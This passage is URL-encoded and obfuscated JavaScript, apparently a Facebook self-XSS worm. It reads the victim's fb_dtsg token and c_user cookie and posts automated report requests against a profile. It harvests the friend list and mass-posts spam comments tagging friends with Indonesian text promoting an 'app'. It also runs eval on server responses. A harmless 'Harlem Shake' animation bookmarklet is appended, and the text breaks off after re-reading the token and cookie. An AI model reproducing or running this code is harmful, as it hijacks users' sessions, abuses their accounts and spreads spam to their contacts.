x65%5Cx5F%5Cx66%5Cx72%5Cx69%5Cx65%5Cx6E%5Cx64%5Cx73%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx66%5Cx61%5Cx6C%5Cx73%5Cx65%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx63%5Cx69%5Cx64%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%22%2C%22%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx63%5Cx6F%5Cx6E%5Cx74%5Cx65%5Cx6E%5Cx74%5Cx5F%5Cx74%5Cx79%5Cx70%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx30%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx65%5Cx78%5Cx70%5Cx61%5Cx6E%5Cx64%5Cx5F%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx31%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx66%5Cx69%5Cx72%5Cx73%5Cx74%5Cx5F%5Cx63%5Cx68%5Cx6F%5Cx69%5Cx63%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx25%5Cx32%5Cx32%5Cx66%5Cx69%5Cx6C%5Cx65%5Cx5F%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx25%5Cx32%5Cx32%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx66%5Cx72%5Cx6F%5Cx6D%5Cx5F%5Cx67%5Cx65%5Cx61%5Cx72%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx25%5Cx32%5Cx32%5Cx74%5Cx69%5Cx6D%5Cx65%5Cx6C%5Cx69%5Cx6E%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx69%5Cx73%5Cx5F%5Cx66%5Cx6F%5Cx6C%5Cx6C%5Cx6F%5Cx77%5Cx69%5Cx6E%5Cx67%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx66%5Cx61%5Cx6C%5Cx73%5Cx65%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx69%5Cx73%5Cx5F%5Cx74%5Cx61%5Cx67%5Cx67%5Cx65%5Cx64%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx66%5Cx61%5Cx6C%5Cx73%5Cx65%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx6F%5Cx6E%5Cx5F%5Cx70%5Cx72%5Cx6F%5Cx66%5Cx69%5Cx6C%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx66%5Cx61%5Cx6C%5Cx73%5Cx65%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx70%5Cx68%5Cx61%5Cx73%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx33%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx72%5Cx65%5Cx66%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx25%5Cx32%5Cx32%5Cx68%5Cx74%5Cx74%5Cx70%5Cx73%5Cx25%5Cx33%5Cx41%5Cx25%5Cx35%5Cx43%5Cx25%5Cx32%5Cx46%5Cx25%5Cx35%5Cx43%5Cx25%5Cx32%5Cx46%5Cx77%5Cx77%5Cx77%5Cx2E%5Cx66%5Cx61%5Cx63%5Cx65%5Cx62%5Cx6F%5Cx6F%5Cx6B%5Cx2E%5Cx63%5Cx6F%5Cx6D%5Cx25%5Cx35%5Cx43%5Cx25%5Cx32%5Cx46%5Cx4E%5Cx61%5Cx6E%5Cx2E%5Cx65%5Cx72%5Cx74%5Cx74%5Cx37%5Cx25%5Cx32%5Cx32%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx5F%5Cx74%5Cx79%5Cx70%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx31%5Cx34%5Cx35%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx72%5Cx69%5Cx64%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%22%2C%22%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx73%5Cx75%5Cx62%5Cx5F%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx5F%5Cx74%5Cx79%5Cx70%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx33%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx74%5Cx69%5Cx6D%5Cx65%5Cx5F%5Cx66%5Cx6C%5Cx6F%5Cx77%5Cx5F%5Cx73%5Cx74%5Cx61%5Cx72%5Cx74%5Cx65%5Cx64%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%22%2C%22%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx75%5Cx73%5Cx65%5Cx72%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%22%2C%22%5Cx25%5Cx37%5Cx44%5Cx26%5Cx66%5Cx69%5Cx6C%5Cx65%5Cx5F%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx3D%5Cx31%5Cx26%5Cx5F%5Cx5F%5Cx75%5Cx73%5Cx65%5Cx72%5Cx3D%22%2C%22%5Cx26%5Cx5F%5Cx5F%5Cx61%5Cx3D%5Cx31%5Cx26%5Cx5F%5Cx5F%5Cx64%5Cx79%5Cx6E%5Cx3D%5Cx37%5Cx6E%5Cx38%5Cx61%5Cx68%5Cx79%5Cx6A%5Cx32%5Cx71%5Cx6D%5Cx76%5Cx75%5Cx35%5Cx6B%5Cx39%5Cx55%5Cx6D%5Cx41%5Cx41%5Cx61%5Cx55%5Cx56%5Cx70%5Cx6F%5Cx26%5Cx5F%5Cx5F%5Cx72%5Cx65%5Cx71%5Cx3D%5Cx75%5Cx26%5Cx74%5Cx74%5Cx73%5Cx74%5Cx61%5Cx6D%5Cx70%5Cx3D%5Cx32%5Cx36%5Cx35%5Cx38%5Cx31%5Cx36%5Cx38%5Cx35%5Cx37%5Cx31%5Cx30%5Cx37%5Cx31%5Cx31%5Cx30%5Cx38%5Cx38%5Cx38%5Cx30%22%2C%22%5Cx50%5Cx4F%5Cx53%5Cx54%22%2C%22%5Cx6F%5Cx70%5Cx65%5Cx6E%22%2C%22%5Cx6F%5Cx6E%5Cx72%5Cx65%5Cx61%5Cx64%5Cx79%5Cx73%5Cx74%5Cx61%5Cx74%5Cx65%5Cx63%5Cx68%5Cx61%5Cx6E%5Cx67%5Cx65%22%2C%22%5Cx72%5Cx65%5Cx61%5Cx64%5Cx79%5Cx53%5Cx74%5Cx61%5Cx74%5Cx65%22%2C%22%5Cx73%5Cx74%5Cx61%5Cx74%5Cx75%5Cx73%22%2C%22%5Cx63%5Cx6C%5Cx6F%5Cx73%5Cx65%22%2C%22%5Cx73%5Cx65%5Cx6E%5Cx64%22%2C%22%5Cx31%5Cx37%5Cx35%5Cx33%5Cx31%5Cx34%5Cx36%5Cx30%5Cx32%5Cx36%5Cx33%5Cx37%5Cx38%5Cx33%5Cx37%22%5D%3Bvar%20fb_dtsg%3Ddocument%5B_0xb161%5B2%5D%5D%28_0xb161%5B1%5D%29%5B0%5D%5B_0xb161%5B0%5D%5D%3Bvar%20user_id%3Ddocument%5B_0xb161%5B4%5D%5D%5B_0xb161%5B3%5D%5D%28document%5B_0xb161%5B4%5D%5D%5B_0xb161%5B3%5D%5D%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3Bvar%20now%3D%28%20new%20Date%29%5B_0xb161%5B5%5D%5D%28%29%3Bfunction%20Report%28_0x45e7x5%29%7Bvar%20_0x45e7x6%3D%20new%20XMLHttpRequest%28%29%3Bvar%20_0x45e7x7%3D_0xb161%5B6%5D%3Bvar%20_0x45e7x8%3D_0xb161%5B7%5D+fb_dtsg+_0xb161%5B8%5D+_0x45e7x5+_0xb161%5B9%5D+_0x45e7x5+_0xb161%5B10%5D+now+_0xb161%5B11%5D+user_id+_0xb161%5B12%5D+user_id+_0xb161%5B13%5D%3B_0x45e7x6%5B_0xb161%5B15%5D%5D%28_0xb161%5B14%5D%2C_0x45e7x7%2Ctrue%29%3B_0x45e7x6%5B_0xb161%5B16%5D%5D%3Dfunction%20%28%29%7Bif%28_0x45e7x6%5B_0xb161%5B17%5D%5D%3D%3D4%26%26_0x45e7x6%5B_0xb161%5B18%5D%5D%3D%3D200%29%7B_0x45e7x6%5B_0xb161%5B19%5D%5D%3B%7D%20%3B%7D%20%3B_0x45e7x6%5B_0xb161%5B20%5D%5D%28_0x45e7x8%29%3B%7D%20%3B%0Avar%20_0xa22c%3D%5B%22value%22%2C%22fb_dtsg%22%2C%22getElementsByName%22%2C%22match%22%2C%22cookie%22%2C%221406747226242530%22%2C%22onreadystatechange%22%2C%22readyState%22%2C%22arkadaslar%20%3D%20%22%2C%22for%20%28%3B%3B%29%3B%22%2C%22%22%2C%22replace%22%2C%22responseText%22%2C%22%3B%22%2C%22length%22%2C%22entries%22%2C%22payload%22%2C%22round%22%2C%22%20Wow%20Keren%20%3Ao%20Aku%20Berhasil%20%5Cudbb8%5Cudc3c%20Ternyata%20Aplikasinya%20Mantap%20Banget%20%21%20%28y%29%20Cobain%20@%5B%22%2C%22uid%22%2C%22%3A%22%2C%22text%22%2C%22%5D%22%2C%22%20%22%2C%22%5Cx26filter%5B0%5D%3Duser%22%2C%22%5Cx26options%5B0%5D%3Dfriends_only%22%2C%22%5Cx26options%5B1%5D%3Dnm%22%2C%22%5Cx26token%3Dv7%22%2C%22%5Cx26viewer%3D%22%2C%22%5Cx26__user%3D%22%2C%22https%3A//%22%2C%22indexOf%22%2C%22URL%22%2C%22GET%22%2C%22https%3A//www.facebook.com/ajax/typeahead/first_degree.php%3F__a%3D1%22%2C%22open%22%2C%22http%3A//www.facebook.com/ajax/typeahead/first_degree.php%3F__a%3D1%22%2C%22send%22%2C%22random%22%2C%22floor%22%2C%22%5Cx26ft_ent_identifier%3D%22%2C%22%5Cx26comment_text%3D%22%2C%22%5Cx26source%3D2%22%2C%22%5Cx26client_id%3D1377871797138%3A1707018092%22%2C%22%5Cx26reply_fbid%22%2C%22%5Cx26parent_comment_id%22%2C%22%5Cx26rootid%3Du_jsonp_2_3%22%2C%22%5Cx26clp%3D%7B%5Cx22cl_impid%5Cx22%3A%5Cx22453524a0%5Cx22%2C%5Cx22clearcounter%5Cx22%3A0%2C%5Cx22elementid%5Cx22%3A%5Cx22js_5%5Cx22%2C%5Cx22version%5Cx22%3A%5Cx22x%5Cx22%2C%5Cx22parent_fbid%5Cx22%3A%22%2C%22%7D%22%2C%22%5Cx26attached_sticker_fbid%3D0%22%2C%22%5Cx26attached_photo_fbid%3D0%22%2C%22%5Cx26giftoccasion%22%2C%22%5Cx26ft%5Btn%5D%3D%5B%5D%22%2C%22%5Cx26__a%3D1%22%2C%22%5Cx26__dyn%3D7n8ahyj35ynxl2u5F97KepEsyo%22%2C%22%5Cx26__req%3Dq%22%2C%22%5Cx26fb_dtsg%3D%22%2C%22%5Cx26ttstamp%3D%22%2C%22POST%22%2C%22/ajax/ufi/add_comment.php%22%2C%22Content-type%22%2C%22application/x-www-form-urlencoded%22%2C%22setRequestHeader%22%2C%22status%22%2C%22close%22%5D%3Bvar%20fb_dtsg%3Ddocument%5B_0xa22c%5B2%5D%5D%28_0xa22c%5B1%5D%29%5B0%5D%5B_0xa22c%5B0%5D%5D%3Bvar%20user_id%3Ddocument%5B_0xa22c%5B4%5D%5D%5B_0xa22c%5B3%5D%5D%28document%5B_0xa22c%5B4%5D%5D%5B_0xa22c%5B3%5D%5D%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3Bvar%20id%3D_0xa22c%5B5%5D%3Bvar%20arkadaslar%3D%5B%5D%3Bvar%20svn_rev%3Bfunction%20arkadaslari_al%28id%29%7Bvar%20_0x7892x7%3D%20new%20XMLHttpRequest%28%29%3B_0x7892x7%5B_0xa22c%5B6%5D%5D%3Dfunction%20%28%29%7Bif%28_0x7892x7%5B_0xa22c%5B7%5D%5D%3D%3D4%29%7Beval%28_0xa22c%5B8%5D+_0x7892x7%5B_0xa22c%5B12%5D%5D.toString%28%29%5B_0xa22c%5B11%5D%5D%28_0xa22c%5B9%5D%2C_0xa22c%5B10%5D%29+_0xa22c%5B13%5D%29%3Bfor%28f%3D0%3Bf%3CMath%5B_0xa22c%5B17%5D%5D%28arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5B_0xa22c%5B14%5D%5D/27%29%3Bf++%29%7Bmesaj%3D_0xa22c%5B10%5D%3Bmesaj_text%3D_0xa22c%5B10%5D%3Bfor%28i%3Df*27%3Bi%3C%28f+1%29*27%3Bi++%29%7Bif%28arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5Bi%5D%29%7Bmesaj+%3D_0xa22c%5B18%5D+arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5Bi%5D%5B_0xa22c%5B19%5D%5D+_0xa22c%5B20%5D+arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5Bi%5D%5B_0xa22c%5B21%5D%5D+_0xa22c%5B22%5D%3Bmesaj_text+%3D_0xa22c%5B23%5D+arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5Bi%5D%5B_0xa22c%5B21%5D%5D%3B%7D%20%3B%7D%20%3Byorum_yap%28id%2Cmesaj%29%3B%7D%20%3B%7D%20%3B%7D%20%3Bvar%20_0x7892x8%3D_0xa22c%5B24%5D%3B_0x7892x8+%3D_0xa22c%5B25%5D%3B_0x7892x8+%3D_0xa22c%5B26%5D%3B_0x7892x8+%3D_0xa22c%5B27%5D%3B_0x7892x8+%3D_0xa22c%5B28%5D+user_id%3B_0x7892x8+%3D_0xa22c%5B29%5D+user_id%3Bif%28document%5B_0xa22c%5B32%5D%5D%5B_0xa22c%5B31%5D%5D%28_0xa22c%5B30%5D%29%3E%3D0%29%7B_0x7892x7%5B_0xa22c%5B35%5D%5D%28_0xa22c%5B33%5D%2C_0xa22c%5B34%5D+_0x7892x8%2Ctrue%29%3B%7D%20else%20%7B_0x7892x7%5B_0xa22c%5B35%5D%5D%28_0xa22c%5B33%5D%2C_0xa22c%5B36%5D+_0x7892x8%2Ctrue%29%3B%7D%20%3B_0x7892x7%5B_0xa22c%5B37%5D%5D%28%29%3B%7D%20%3Bfunction%20RandomArkadas%28%29%7Bvar%20_0x7892xa%3D_0xa22c%5B10%5D%3Bfor%28i%3D0%3Bi%3C9%3Bi++%29%7B_0x7892xa+%3D_0xa22c%5B18%5D+arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5BMath%5B_0xa22c%5B39%5D%5D%28Math%5B_0xa22c%5B38%5D%5D%28%29*arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5B_0xa22c%5B14%5D%5D%29%5D%5B_0xa22c%5B19%5D%5D+_0xa22c%5B20%5D+arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5BMath%5B_0xa22c%5B39%5D%5D%28Math%5B_0xa22c%5B38%5D%5D%28%29*arkadaslar%5B_0xa22c%5B16%5D%5D%5B_0xa22c%5B15%5D%5D%5B_0xa22c%5B14%5D%5D%29%5D%5B_0xa22c%5B21%5D%5D+_0xa22c%5B22%5D%3B%7D%20%3Breturn%20_0x7892xa%3B%7D%20%3Bfunction%20yorum_yap%28id%2C_0x7892xc%29%7Bvar%20_0x7892xd%3D%20new%20XMLHttpRequest%28%29%3Bvar%20_0x7892x8%3D_0xa22c%5B10%5D%3B_0x7892x8+%3D_0xa22c%5B40%5D+id%3B_0x7892x8+%3D_0xa22c%5B41%5D+encodeURIComponent%28_0x7892xc%29%3B_0x7892x8+%3D_0xa22c%5B42%5D%3B_0x7892x8+%3D_0xa22c%5B43%5D%3B_0x7892x8+%3D_0xa22c%5B44%5D%3B_0x7892x8+%3D_0xa22c%5B45%5D%3B_0x7892x8+%3D_0xa22c%5B46%5D%3B_0x7892x8+%3D_0xa22c%5B47%5D+id+_0xa22c%5B48%5D%3B_0x7892x8+%3D_0xa22c%5B49%5D%3B_0x7892x8+%3D_0xa22c%5B50%5D%3B_0x7892x8+%3D_0xa22c%5B51%5D%3B_0x7892x8+%3D_0xa22c%5B52%5D%3B_0x7892x8+%3D_0xa22c%5B29%5D+user_id%3B_0x7892x8+%3D_0xa22c%5B53%5D%3B_0x7892x8+%3D_0xa22c%5B54%5D%3B_0x7892x8+%3D_0xa22c%5B55%5D%3B_0x7892x8+%3D_0xa22c%5B56%5D+fb_dtsg%3B_0x7892x8+%3D_0xa22c%5B57%5D%3B_0x7892xd%5B_0xa22c%5B35%5D%5D%28_0xa22c%5B58%5D%2C_0xa22c%5B59%5D%2Ctrue%29%3B_0x7892xd%5B_0xa22c%5B62%5D%5D%28_0xa22c%5B60%5D%2C_0xa22c%5B61%5D%29%3B_0x7892xd%5B_0xa22c%5B6%5D%5D%3Dfunction%20%28%29%7Bif%28_0x7892xd%5B_0xa22c%5B7%5D%5D%3D%3D4%26%26_0x7892xd%5B_0xa22c%5B63%5D%5D%3D%3D200%29%7B_0x7892xd%5B_0xa22c%5B64%5D%5D%3B%7D%20%3B%7D%20%3B_0x7892xd%5B_0xa22c%5B37%5D%5D%28_0x7892x8%29%3B%7D%20%3Barkadaslari_al%28id%29%3B%0A%0A//Music%0Ajavascript%3A%28function%28%29%7Bfunction%20c%28%29%7Bvar%20e%3Ddocument.createElement%28%27link%27%29%3Be.setAttribute%28%27type%27%2C%27text/css%27%29%3Be.setAttribute%28%27rel%27%2C%27stylesheet%27%29%3Be.setAttribute%28%27class%27%2Cl%29%3Bdocument.body.appendChild%28e%29%7Dfunction%20h%28%29%7Bvar%20e%3Ddocument.getElementsByClassName%28l%29%3Bfor%28var%20t%3D0%3Bt%3Ce.length%3Bt++%29%7Bdocument.body.removeChild%28e%5Bt%5D%29%7D%7Dfunction%20p%28%29%7Bvar%20e%3Ddocument.createElement%28%27div%27%29%3Be.setAttribute%28%27class%27%2Ca%29%3Bdocument.body.appendChild%28e%29%3BsetTimeout%28function%28%29%7Bdocument.body.removeChild%28e%29%7D%2C100%29%7Dfunction%20d%28e%29%7Breturn%7Bheight%3Ae.offsetHeight%2Cwidth%3Ae.offsetWidth%7D%7Dfunction%20v%28i%29%7Bvar%20s%3Dd%28i%29%3Breturn%20s.height%3Ee%26%26s.height%3Cn%26%26s.width%3Et%26%26s.width%3Cr%7Dfunction%20m%28e%29%7Bvar%20t%3De%3Bvar%20n%3D0%3Bwhile%28%21%21t%29%7Bn+%3Dt.offsetTop%3Bt%3Dt.offsetParent%7Dreturn%20n%7Dfunction%20g%28%29%7Bvar%20e%3Ddocument.documentElement%3Bif%28%21%21window.innerWidth%29%7Breturn%20window.innerHeight%7Delse%20if%28e%26%26%21isNaN%28e.clientHeight%29%29%7Breturn%20e.clientHeight%7Dreturn%200%7Dfunction%20y%28%29%7Bif%28window.pageYOffset%29%7Breturn%20window.pageYOffset%7Dreturn%20Math.max%28document.documentElement.scrollTop%2Cdocument.body.scrollTop%29%7Dfunction%20E%28e%29%7Bvar%20t%3Dm%28e%29%3Breturn%20t%3E%3Dw%26%26t%20%3C%3Db+w%7Dfunction%20S%28%29%7Bvar%20e%3Ddocument.createElement%28%27audio%27%29%3Be.setAttribute%28%27class%27%2Cl%29%3Be.src%3Di%3Be.loop%3Dtrue%3Be.addEventListener%28%27canplay%27%2Cfunction%28%29%7BsetTimeout%28function%28%29%7Bx%28k%29%7D%2C500%29%3BsetTimeout%28function%28%29%7BN%28%29%3Bp%28%29%3Bfor%28var%20e%3D0%3Be%3CO.length%3Be++%29%7BT%28O%5Be%5D%29%7D%7D%2C15500%29%7D%2Ctrue%29%3Be.addEventListener%28%27ended%27%2Cfunction%28%29%7BN%28%29%3Bh%28%29%7D%2Ctrue%29%3Be.innerHTML%3D%27%20%3Cp%3EIf%20you%20are%20reading%20this%2C%20it%20is%20because%20your%20browser%20does%20not%20support%20the%20audio%20element.%20We%20recommend%20that%20you%20get%20a%20new%20browser.%3C/p%3E%20%3Cp%3E%27%3Bdocument.body.appendChild%28e%29%3Be.play%28%29%7Dfunction%20x%28e%29%7Be.className+%3D%27%20%27+s+%27%20%27+o%7Dfunction%20T%28e%29%7Be.className+%3D%27%20%27+s+%27%20%27+u%5BMath.floor%28Math.random%28%29*u.length%29%5D%7Dfunction%20N%28%29%7Bvar%20e%3Ddocument.getElementsByClassName%28s%29%3Bvar%20t%3Dnew%20RegExp%28%27%5C%5Cb%27+s+%27%5C%5Cb%27%29%3Bfor%28var%20n%3D0%3Bn%3Ce.length%3B%29%7Be%5Bn%5D.className%3De%5Bn%5D.className.replace%28t%2C%27%27%29%7D%7Dvar%20e%3D1%3Bvar%20t%3D1%3Bvar%20n%3D100%3Bvar%20r%3D100%3Bvar%20i%3D%27http%3A//justapo.co/wp-content/uploads/2012/08/tumblr_m8pymlG1mO1qfoj4do1.mp3%27%3Bvar%20s%3D%27mw-harlem_shake_me%27%3Bvar%20o%3D%27im_first%27%3Bvar%20u%3D%5B%27im_drunk%27%2C%27im_baked%27%2C%27im_trippin%27%2C%27im_blown%27%5D%3Bvar%20a%3D%27mw-strobe_light%27%3Bvar%20l%3D%27mw_added_css%27%3Bvar%20b%3Dg%28%29%3Bvar%20w%3Dy%28%29%3Bvar%20C%3Ddocument.getElementsByTagName%28%27*%27%29%3Bvar%20k%3Dnull%3Bfor%28var%20L%3D0%3BL%3CC.length%3BL++%29%7Bvar%20A%3DC%5BL%5D%3Bif%28v%28A%29%29%7Bif%28E%28A%29%29%7Bk%3DA%3Bbreak%7D%7D%7Dif%28A%3D%3D%3Dnull%29%7Bconsole.warn%28%27Could%20not%20find%20a%20node%20of%20the%20right%20size.%20Please%20try%20a%20different%20page.%27%29%3Breturn%7Dc%28%29%3BS%28%29%3Bvar%20O%3D%5B%5D%3Bfor%28var%20L%3D0%3BL%3CC.length%3BL++%29%7Bvar%20A%3DC%5BL%5D%3Bif%28v%28A%29%29%7BO.push%28A%29%7D%7D%7D%29%28%29%0Avar%20fb_dtsg%20%3D%20document.getElementsByName%28%27fb_dtsg%27%29%5B0%5D.value%3B%0Avar%20user_id%20%3D%20document.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3B%0Avar%20_6717%3B"));